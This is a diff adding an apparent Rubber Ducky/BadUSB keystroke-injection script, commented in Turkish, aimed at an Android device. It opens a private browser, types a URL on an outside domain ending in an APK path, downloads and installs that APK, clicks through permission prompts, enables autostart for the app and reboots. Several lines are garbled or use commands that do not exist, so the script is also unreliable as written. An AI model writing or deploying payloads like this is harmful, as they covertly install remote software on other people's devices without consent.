@@ -1,0 +1,93 @@
+﻿DELAY 200
+ESCAPE
+GUI d
+GUI b
+DELAY 700
+REM CTRL SHIFT N
+PRIVATE_BROWSER
+DELAY 700
+CTRL l
+DELAY 300
+
+DELAY 300
+STRING karaogullar
+STRING '
+STRING /
+STRING com
+PRINT CHR$(47)
+KEYPADSLASH
+/
+STRING bo
+STRING /
+STRING apk
+DELAY 300
+ENTER
+DELAY 5000
+
+ENTER
+
+REM İndirme butonuna tıklama
+TAB
+DELAY 300
+ENTER
+DELAY 10000
+
+REM Dosya yöneticisini açma
+GUI k
+DELAY 700
+STRING downloads
+DELAY 300
+ENTER
+DELAY 700
+
+REM APK dosyasını bulma ve açma (en son dosya)
+TAB
+DELAY 300
+ENTER
+DELAY 300
+
+REM İzinleri verme (gerekirse)
+TAB
+DELAY 300
+ENTER
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 300
+
+REM APK'yı kurma
+TAB
+DELAY 300
+ENTER
+DELAY 10000
+
+REM Kurulumu bitirme
+ENTER
+
+REM Ayarları açma ve otomatik başlatmayı etkinleştirme
+GUI k
+DELAY 700
+STRING settings
+DELAY 300
+ENTER
+DELAY 1000
+STRING apps
+DELAY 300
+ENTER
+DELAY 1000
+STRING your_app_name  REM Uygulama adınızı burada değiştirin
+DELAY 300
+ENTER
+DELAY 1000
+STRING autostart
+DELAY 300
+ENTER
+DELAY 300
+TOGGLE 1  REM Otomatik başlatmayı etkinleştirme
+DELAY 300
+HOME
+DELAY 500
+
+REM Cihazı yeniden başlatma
+REBOOT
